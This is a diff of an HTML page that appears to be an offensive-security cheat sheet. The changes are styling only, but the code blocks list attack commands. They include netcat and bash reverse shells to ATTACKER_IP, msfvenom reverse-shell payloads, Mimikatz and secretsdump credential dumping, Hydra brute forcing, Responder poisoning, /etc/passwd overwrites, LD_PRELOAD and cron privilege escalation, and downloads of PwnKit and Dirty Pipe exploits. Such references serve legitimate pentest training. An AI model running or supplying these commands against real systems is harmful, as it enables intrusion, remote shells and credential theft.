@@ -7131,8 +7132,8 @@ sqlmap --list-tampers</code></pre></div>
 <div class="col-b">
 <h3>John</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">John</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>john --identify hashes.txt
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">John</span></div>
+<div class="tbox-b"><pre><code>john --identify hashes.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --format=raw-sha256 hashes.txt
 john --show hashes.txt
@@ -7141,8 +7142,8 @@ rar2john secret.rar &gt; rar_hash.txt</code></pre></div>
 </div>
 <h3>Hashcat</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Hashcat</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Modes: -a 0=dict, -a 3=mask
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Hashcat</span></div>
+<div class="tbox-b"><pre><code># Modes: -a 0=dict, -a 3=mask
 # Hash types: 0=MD5, 1000=NTLM, 13100=Kerberoast, 5600=NetNTLMv2
 
 hashcat -m 0 -a 0 hashes.txt rockyou.txt
@@ -7158,8 +7159,8 @@ hashcat -m 0 hashes.txt --show</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Hydra &#8212; Login Brute-Forcer</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Hydra</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>hydra -l admin -P passwords.txt ssh://10.10.10.10
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Hydra</span></div>
+<div class="tbox-b"><pre><code>hydra -l admin -P passwords.txt ssh://10.10.10.10
 hydra -l admin -P passwords.txt ftp://10.10.10.10
 hydra -l administrator -P passwords.txt rdp://10.10.10.10
 hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect"
@@ -7176,16 +7177,16 @@ hydra -P passwords.txt vnc://10.10.10.10
 <div class="col-b">
 <h3>Gobuster</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Gobuster</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>gobuster dir -u http://target.com -w wordlist.txt -t 50
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Gobuster</span></div>
+<div class="tbox-b"><pre><code>gobuster dir -u http://target.com -w wordlist.txt -t 50
 gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
 gobuster vhost -u http://target.com -w subdomains.txt
 gobuster dns -d target.com -w subdomains.txt -t 50</code></pre></div>
 </div>
 <h3>FFuf</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">FFuf</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>ffuf -u http://target.com/FUZZ -w wordlist.txt -t 50
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">FFuf</span></div>
+<div class="tbox-b"><pre><code>ffuf -u http://target.com/FUZZ -w wordlist.txt -t 50
 ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242
 ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404
 ffuf -u "http://target.com/page?id=FUZZ" -w params.txt -fs 0
@@ -7199,8 +7200,8 @@ ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0</co
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Netcat &#8212; Network Swiss Army Knife</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Netcat</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nc -lvnp 4444
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Netcat</span></div>
+<div class="tbox-b"><pre><code>nc -lvnp 4444
 nc -e /bin/sh ATTACKER_IP 4444
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc ATTACKER_IP 4444 &gt; /tmp/f
 nc -zv target 80,443,8080
@@ -7213,8 +7214,8 @@ ncat --ssl -lvnp 4444</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Nikto &#8212; Web Server Scanner</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Nikto</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nikto -h http://target.com
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Nikto</span></div>
+<div class="tbox-b"><pre><code>nikto -h http://target.com
 nikto -h http://target.com -p 8080
 nikto -h target.com -o results.html -Format html
 nikto -h target.com -id admin:password
@@ -7227,8 +7228,8 @@ nikto -h target.com -useproxy http://127.0.0.1:8080</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Aircrack-ng Suite</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Aircrack-ng</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>airmon-ng check kill
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Aircrack-ng</span></div>
+<div class="tbox-b"><pre><code>airmon-ng check kill
 airmon-ng start wlan0
 airodump-ng wlan0mon
 airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
@@ -7242,8 +7243,8 @@ aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap</code></pre></div
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Responder &#8212; LLMNR/NBT-NS Poisoner</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Responder</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo responder -I eth0 -wrf
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Responder</span></div>
+<div class="tbox-b"><pre><code>sudo responder -I eth0 -wrf
 sudo responder -I eth0 -A
 hashcat -m 5600 captured_hashes.txt rockyou.txt
 john --format=netntlmv2 captured_hashes.txt</code></pre></div>
@@ -7257,8 +7258,8 @@ When Windows fails DNS resolution, it falls back to LLMNR/NBT-NS. Responder pois
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">BloodHound &#8212; AD Attack Path Analysis</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">BloodHound</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Collector
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">BloodHound</span></div>
+<div class="tbox-b"><pre><code># Collector
 .\SharpHound.exe -c All --zip
 
 # From Linux
@@ -7273,8 +7274,8 @@ bloodhound-python -u user@target.local -p 'Password1' -d target.local -c All --z
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Mimikatz &#8212; Credential Theft</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Mimikatz</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>privilege::debug
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Mimikatz</span></div>
+<div class="tbox-b"><pre><code>privilege::debug
 token::elevate
 sekurlsa::logonpasswords
 sekurlsa::tickets /export
@@ -7291,8 +7292,8 @@ Alternatives: Invoke-Mimikatz, Rubeus, LaZagne, SharpDPAPI, nanodump, pypykatz.<
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">CrackMapExec / NetExec</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">NetExec</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nxc smb 10.10.10.0/24 -u user -p pass --shares
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">NetExec</span></div>
+<div class="tbox-b"><pre><code>nxc smb 10.10.10.0/24 -u user -p pass --shares
 nxc smb 10.10.10.10 -u admin -p pass -x "whoami"
 nxc smb 10.10.10.10 -u admin -p pass --sam
 nxc ldap 10.10.10.10 -u user -p pass --kerberoast output.txt
@@ -7307,8 +7308,8 @@ nxc ssh 10.10.10.10 -u user -p pass -x "id"</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Evil-WinRM</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Evil-WinRM</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>evil-winrm -i 10.10.10.10 -u user -p password
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Evil-WinRM</span></div>
+<div class="tbox-b"><pre><code>evil-winrm -i 10.10.10.10 -u user -p password
 evil-winrm -i 10.10.10.10 -u user -c cert.pem -k key.pem
 evil-winrm -i 10.10.10.10 -u user -p pass -s /scripts/ -e /scripts/exec.ps1
 # In session: upload local.txt C:\remote.txt / download C:\remote.txt local.txt</code></pre></div>
@@ -7321,8 +7322,8 @@ evil-winrm -i 10.10.10.10 -u user -p pass -s /scripts/ -e /scripts/exec.ps1
 <div class="col-b">
 <h3>Chisel</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Chisel</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Server (attacker)
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Chisel</span></div>
+<div class="tbox-b"><pre><code># Server (attacker)
 chisel server --reverse -p 8080
 # Client (target)
 chisel client ATTACKER_IP:8080 R:socks
@@ -7333,8 +7334,8 @@ chisel client ATTACKER_IP:8080 --auth user:pass R:socks</code></pre></div>
 </div>
 <h3>Ligolo-ng</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Ligolo-ng</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Server (attacker)
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Ligolo-ng</span></div>
+<div class="tbox-b"><pre><code># Server (attacker)
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
@@ -7350,8 +7351,8 @@ sudo ip route add 10.10.10.0/24 dev ligolo</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Bettercap &#8212; MITM Framework</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Bettercap</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo bettercap
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Bettercap</span></div>
+<div class="tbox-b"><pre><code>sudo bettercap
 net.probe on
 net.show
 set arp.spoof.targets 10.10.10.1
@@ -7368,8 +7369,8 @@ dns.spoof on</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Nuclei &#8212; Template-Based Scanner</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Nuclei</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>nuclei -update-templates
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Nuclei</span></div>
+<div class="tbox-b"><pre><code>nuclei -update-templates
 nuclei -u http://target.com
 nuclei -l urls.txt
 nuclei -u http://target.com -severity critical,high
@@ -7385,8 +7386,8 @@ nuclei -u http://target.com -rate-limit 100</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Amass &#8212; Subdomain Enumeration</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Amass</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>amass enum -passive -d target.com
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Amass</span></div>
+<div class="tbox-b"><pre><code>amass enum -passive -d target.com
 amass enum -active -d target.com -brute
 amass intel -org "Company Name"
 amass track -d target.com -last 30d</code></pre></div>
@@ -7398,8 +7399,8 @@ amass track -d target.com -last 30d</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Impacket Suite</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Impacket</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Tools: secretsdump.py, psexec.py, wmiexec.py, smbexec.py, getTGT.py, getST.py, ticketer.py
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Impacket</span></div>
+<div class="tbox-b"><pre><code># Tools: secretsdump.py, psexec.py, wmiexec.py, smbexec.py, getTGT.py, getST.py, ticketer.py
 psexec.py target.local/user:password@10.10.10.10
 wmiexec.py target.local/user:password@10.10.10.10
 secretsdump.py target.local/user:password@10.10.10.10
@@ -7416,8 +7417,8 @@ ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain target.local Ad
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">LinPEAS &amp; WinPEAS</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">PEAS</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>curl -L https://github.com/PEASS-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">PEAS</span></div>
+<div class="tbox-b"><pre><code>curl -L https://github.com/PEASS-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ./linpeas.sh -q
@@ -7430,8 +7431,8 @@ chmod +x linpeas.sh
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Sherlock &amp; Maigret &#8212; OSINT Username Search</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Username OSINT</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>pip install sherlock-project
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Username OSINT</span></div>
+<div class="tbox-b"><pre><code>pip install sherlock-project
 sherlock username
 sherlock username --output results.txt
 
@@ -7507,8 +7508,8 @@ Always follow: <strong>Enumerate &#8594; Identify &#8594; Exploit &#8594; Verify
 <div class="col-b">
 <h3>Finding SUID Binaries</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">SUID Enumeration</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>find / -perm -u=s -type f 2>/dev/null
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">SUID Enumeration</span></div>
+<div class="tbox-b"><pre><code>find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
 getcap -r / 2>/dev/null</code></pre></div>
 </div>
@@ -7527,8 +7528,8 @@ getcap -r / 2>/dev/null</code></pre></div>
 <tr><td><code>nmap</code></td><td><code>nmap --interactive &#8594; !sh</code> (old versions)</td></tr>
 </table>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">cp Overwrite /etc/passwd</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>openssl passwd -1 -salt xyz newpass
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">cp Overwrite /etc/passwd</span></div>
+<div class="tbox-b"><pre><code>openssl passwd -1 -salt xyz newpass
 echo 'root2:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd
 cp /tmp/passwd /etc/passwd
 su root2</code></pre></div>
@@ -7543,8 +7544,8 @@ Always check <code>https://gtfobins.github.io</code> for the latest SUID exploit
 <div class="col-b">
 <h3>Finding Sudo Rights</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Sudo Enumeration</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>sudo -l
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Sudo Enumeration</span></div>
+<div class="tbox-b"><pre><code>sudo -l
 cat /etc/sudoers
 grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null</code></pre></div>
 </div>
@@ -7564,8 +7565,8 @@ grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null</code></pre></div>
 </table>
 <h3>LD_PRELOAD</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">LD_PRELOAD Attack</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>cat &gt; /tmp/shell.c &lt;&lt; 'EOF'
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">LD_PRELOAD Attack</span></div>
+<div class="tbox-b"><pre><code>cat &gt; /tmp/shell.c &lt;&lt; 'EOF'
 #include &lt;stdio.h&gt;
 void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash"); }
 EOF
@@ -7579,8 +7580,8 @@ sudo LD_PRELOAD=/tmp/shell.so any_sudo_command</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Linux Capabilities Abuse</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Capabilities</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>getcap -r / 2>/dev/null
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Capabilities</span></div>
+<div class="tbox-b"><pre><code>getcap -r / 2>/dev/null
 # cap_setuid + python3:
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 # cap_setuid + perl:
@@ -7603,8 +7604,8 @@ vim /etc/shadow</code></pre></div>
 <div class="col-b">
 <h3>Dirty Pipe (CVE-2022-0847)</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Dirty Pipe</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Affects Linux 5.8 to 5.16.11
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Dirty Pipe</span></div>
+<div class="tbox-b"><pre><code># Affects Linux 5.8 to 5.16.11
 uname -r
 curl -L https://raw.githubusercontent.com/lyber/Dirty-Pipe/main/exploit.c -o exploit.c
 gcc -o exploit exploit.c
@@ -7612,14 +7613,14 @@ gcc -o exploit exploit.c
 </div>
 <h3>Dirty COW (CVE-2016-5195)</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Dirty COW</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>gcc -pthread dirty.c -o dirty -lcrypt
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Dirty COW</span></div>
+<div class="tbox-b"><pre><code>gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty</code></pre></div>
 </div>
 <h3>PwnKit (CVE-2021-4034)</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">PwnKit</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>curl -L https://github.com/ly4k/PwnKit/releases/latest/download/PwnKit -o PwnKit
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">PwnKit</span></div>
+<div class="tbox-b"><pre><code>curl -L https://github.com/ly4k/PwnKit/releases/latest/download/PwnKit -o PwnKit
 chmod +x PwnKit
 ./PwnKit</code></pre></div>
 </div>
@@ -7638,8 +7639,8 @@ chmod +x PwnKit
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Cron Job Exploitation</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Cron Enumeration</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>cat /etc/crontab
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Cron Enumeration</span></div>
+<div class="tbox-b"><pre><code>cat /etc/crontab
 ls -la /etc/cron.d/
 crontab -l
 find /etc/cron* -type f -writable 2>/dev/null
@@ -7647,8 +7648,8 @@ find / -name "*.sh" -writable 2>/dev/null</code></pre></div>
 </div>
 <h3>Exploitation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Cron Exploits</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># Writable cron script
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Cron Exploits</span></div>
+<div class="tbox-b"><pre><code># Writable cron script
 echo '#!/bin/bash' > /opt/backup.sh
 echo 'bash -i >&amp; /dev/tcp/ATTACKER_IP/4444 0>&amp;1' >> /opt/backup.sh
 chmod +x /opt/backup.sh
@@ -7669,15 +7670,15 @@ echo "" > "--checkpoint-action=exec=sh reverse.sh"</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">PATH Manipulation &amp; Writable /etc/passwd</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">PATH Hijack</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w {} &amp;&amp; echo "Writable: {}"'
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">PATH Hijack</span></div>
+<div class="tbox-b"><pre><code>echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w {} &amp;&amp; echo "Writable: {}"'
 echo '#!/bin/bash' > /tmp/script &amp;&amp; echo '/bin/bash' >> /tmp/script
 chmod +x /tmp/script
 export PATH=/tmp:$PATH</code></pre></div>
 </div>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Writable /etc/passwd</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>test -w /etc/passwd &amp;&amp; echo "WRITABLE"
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Writable /etc/passwd</span></div>
+<div class="tbox-b"><pre><code>test -w /etc/passwd &amp;&amp; echo "WRITABLE"
 openssl passwd -1 -salt abc123 "newpass"
 echo 'newroot:$1$abc123$HASH:0:0:Root:/root:/bin/bash' >> /etc/passwd
 su newroot</code></pre></div>
@@ -7689,8 +7690,8 @@ su newroot</code></pre></div>
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">NFS Root Squashing Bypass</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">NFS Attack</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>showmount -e TARGET_IP
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">NFS Attack</span></div>
+<div class="tbox-b"><pre><code>showmount -e TARGET_IP
 mount -t nfs TARGET_IP:/share /tmp/nfs
 cp /bin/bash /tmp/nfs/rootbash &amp;&amp; chmod +s /tmp/nfs/rootbash
 # On target: /share/rootbash -p</code></pre></div>
@@ -7702,8 +7703,8 @@ cp /bin/bash /tmp/nfs/rootbash &amp;&amp; chmod +s /tmp/nfs/rootbash
 <div class="col-h"><span class="ci">&#9654;</span><span class="ct">Docker Container Escape</span></div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Docker Escapes</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>cat /proc/1/cgroup | grep -i docker
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Docker Escapes</span></div>
+<div class="tbox-b"><pre><code>cat /proc/1/cgroup | grep -i docker
 ls -la /.dockerenv
 
 # Mount host filesystem
@@ -7727,22 +7728,22 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</code></pre></di
 <div class="col-b">
 <h3>Unquoted Service Paths</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Unquoted Service Path</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v "\""
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Unquoted Service Path</span></div>
+<div class="tbox-b"><pre><code>wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows" | findstr /i /v "\""
 # Windows: C:\Program Files\My Service\service.exe &#8594; looks for C:\Program.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o "Program.exe"
 sc stop "ServiceName" &amp;&amp; sc start "ServiceName"</code></pre></div>
 </div>
 <h3>DLL Hijacking</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">DLL Hijacking</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># ProcMon: Path ends with .dll AND Result is NAME NOT FOUND
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">DLL Hijacking</span></div>
+<div class="tbox-b"><pre><code># ProcMon: Path ends with .dll AND Result is NAME NOT FOUND
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijacked.dll</code></pre></div>
 </div>
 <h3>Token Impersonation (Potato Attacks)</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">Potato Attacks</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code># JuicyPotato (Win 7-10 / Server 2008-2016)
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><span class="ttle">Potato Attacks</span></div>
+<div class="tbox-b"><pre><code># JuicyPotato (Win 7-10 / Server 2008-2016)
 JuicyPotato.exe -l 1337 -p C:\shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
 # PrintSpoofer (Win 10 / Server 2016-2019)
 PrintSpoofer.exe -c "C:\nc.exe ATTACKER_IP 4444 -e cmd.exe"
@@ -7753,16 +7754,16 @@ RoguePotato.exe -r ATTACKER_IP -l 9999 -p C:\shell.exe</code></pre></div>
 </div>
 <h3>AlwaysInstallElevated</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><span class="ttle">AlwaysInstallElevated</span></div>
-<div class="tbox-b"><pre><button class="cpy" onclick="copyCode(this)"></button><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
